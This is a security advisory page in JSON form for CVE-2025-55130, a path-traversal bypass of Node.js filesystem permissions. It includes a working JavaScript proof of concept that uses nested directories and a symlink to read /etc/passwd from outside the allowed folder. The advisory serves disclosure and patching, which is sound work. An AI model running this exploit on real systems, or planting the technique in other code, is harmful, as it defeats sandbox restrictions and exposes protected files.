{"hash":"a54e1aefaaa25d93d91214700400227a62d7711f","data":{"post":{"title":"Node.js filesystem permissions bypass","path":"/vulnerabilities/nodejs-fs-permissions-bypass-cve-2025-55130/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>A path traversal vulnerability in Node.js allows a user to break out of the FS permissions restrictions and gain read/write access to unintended files.</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>Node.js</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>[20.0.0,20.20.0)</p>\n<p>[22.0.0,22.22.0)</p>\n<p>[24.0.0,24.13.0)</p>\n<p>[25.0.0,25.3.0)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>Node.js allows users to restrict the access of a process to the system resources by defining <code>--allow-fs-read</code> and <code>--allow-fs-write</code>.</p>\n<p>It was found that if the user is granted read/write permissions in the current directory, it is possible to manipulate the process and break out of the allowed folder using a local symlink as part of path resolution, granting the user access to files outside of the intended scope.</p>\n<p>The vulnerability affects applications using the <code>--permission</code> module with the <code>--allow-fs-read</code> or <code>--allow-fs-write</code> flags.</p>\n<p>An example of vulnerable usage of Node.js:</p>\n<pre><code>node --permission --allow-fs-read=. --allow-fs-write=. poc.js\n</code></pre>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>We will use the fact that file permissions and path resolved are being checked separately, and after approving the file permission - any action will be authorized.\nWe will create authorized symlinks, but arrange them in a manner that will be resolved into unauthorized paths! (each created subdirectory allows us to traverse one more directory outside of the allowed path)</p>\n<pre><code class=\"language-javascript\">const fs = require('fs');\nfs.mkdirSync('pwned1');\nfs.mkdirSync('pwned1/pwned2');\nfs.mkdirSync('pwned1/pwned2/pwned3');\nfs.mkdirSync('pwned1/pwned2/pwned3/pwned4');\nfs.mkdirSync('pwned1/pwned2/pwned3/pwned4/pwned5');\nfs.mkdirSync('pwned1/pwned2/pwned3/pwned4/pwned5/pwned6');\nfs.mkdirSync('pwned1/pwned2/pwned3/pwned4/pwned5/pwned6/pwned7');\nvar ALLOWED_SUB_FOLDERS = './pwned1/pwned2/pwned3/pwned4/pwned5/pwned6/pwned7'\nfs.symlinkSync(\n    __dirname,\n     ALLOWED_SUB_FOLDERS + '/gotcha');\nconsole.log(fs.readFileSync(ALLOWED_SUB_FOLDERS+'/gotcha'+'/../../../../../../etc/passwd', 'utf8'));\n</code></pre>\n<p>We will run this script with the following command, and view how the content of “/etc/passwd” being printed to console:</p>\n<pre><code>node --permission --allow-fs-read=. --allow-fs-write=. poc.js\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/nodejs/node/commit/26be208039863f54f84ff01e8a0db1a4adf3a019\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Fix commit</a></p>\n","description":"CVE-2025-55130, HIGH, A path traversal vulnerability in Node.js allows a user to break out of the FS permissions restrictions and gain read/write access to unintended files.","date_published":"2026-01-13","xray_id":"","vul_id":"CVE-2025-55130","severity":"high","discovered_by":"Natan Nehorai","last_updated":"2026-01-13","cvss":8.3}},"context":{}}